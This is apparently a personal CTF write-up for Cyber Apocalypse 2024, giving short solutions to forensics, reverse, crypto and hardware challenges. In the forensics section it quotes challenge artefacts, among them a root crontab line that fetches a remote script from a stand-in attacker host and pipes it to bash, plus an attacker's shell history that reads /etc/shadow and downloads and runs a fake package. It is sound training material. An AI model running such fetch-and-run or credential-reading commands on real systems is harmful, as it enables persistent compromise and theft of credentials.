---
author: pl4int3xt
layout: post
title: Cyber Apocalypse 2024
date: '2024-03-09'
description: "Cyber apocalypse ctf 2024 Hacker royale"
useRelativeCover: true
cover: cover.jpg
categories: [Capture The Flag]
---


## Forensics
### Urgent

The first message is base64 encoded. the second message is url encoded

### It has begun


```
echo "*/5 * * * * root curl -s http://legions.korp.htb/0xda4.0xda4.$ARCH | bash -c 'NG5kX3kwdVJfR3IwdU5kISF9' " >> /etc/crontab
```

```
pl4int3xt@archlinux ~> echo 'NG5kX3kwdVJfR3IwdU5kISF9' | base64 -d
4nd_y0uR_Gr0uNd!!}
```

### An unusual sighting
```
What is the IP Address and Port of the SSH Server (IP:PORT)
```
sshd.log
```
[2024-01-28 15:24:23] Connection from 100.72.1.95 port 47721 on 100.107.36.130 port 2221 rdomain ""
```
```
100.107.36.130:2221
```
```
What time is the first successful Login
```
```
[2024-02-13 11:29:50] Accepted password for root from 100.81.51.199 port 63172 ssh2
```
```
2024-02-13 11:29:50
```
```
What is the time of the unusual Login
```
```
Note: Operating Hours of Korp: 0900 - 1900
[2024-02-19 04:00:14] Accepted password for root from 2.67.182.119 port 60071 ssh2
```
```
2024-02-19 04:00:14
```

```
What is the Fingerprint of the attacker's public key
```
```
[2024-02-19 04:00:14] Failed publickey for root from 2.67.182.119 port 60071 ssh2: ECDSA SHA256:OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```
```
OPkBSs6okUKraq8pYo4XwwBg55QSo210F09FCe1-yj4
```
```
What is the first command the attacker executed after logging in
```
```
What is the final command the attacker executed before logging out
```
bash_history.txt
```
[2024-02-19 04:00:18] whoami
[2024-02-19 04:00:20] uname -a
[2024-02-19 04:00:40] cat /etc/passwd
[2024-02-19 04:01:01] cat /etc/shadow
[2024-02-19 04:01:15] ps faux
[2024-02-19 04:02:27] wget https://gnu-packages.com/prebuilts/iproute2/latest.tar.gz -O /tmp/latest_iproute.tar.gz
[2024-02-19 04:10:02] tar xvf latest.tar.gz
[2024-02-19 04:12:02] shred -zu latest.tar.gz
[2024-02-19 04:14:02] ./setup
```
```
[+] Here is the flag: HTB{B3sT_0f_luck_1n_th3_Fr4y!!}
```

## Reverse 
### LootStash

run strings and scroll

## Crypto
### Makeshift

```python
from secret import FLAG

flag = FLAG[::-1]
new_flag = ''

for i in range(0, len(flag), 3):
    new_flag += flag[i+1]
    new_flag += flag[i+2]
    new_flag += flag[i]

print(new_flag)
```

```python
new_flag = "!?}De!e3d_5n_nipaOw_3eTR3bt4{_THB"
flag = ''

for i in range(0, len(new_flag), 3):
    flag += new_flag[i+2]
    flag += new_flag[i]
    flag += new_flag[i+1]

original_flag = flag[::-1]
print(original_flag)
```
```shell
pl4int3xt@archlinux ~/D/cyberapocalypse> python3 decrypt.py
HTB{4_b3tTeR_w3apOn_i5_n3edeD!?!}
```

## Hardware
### Maze

in the pdf

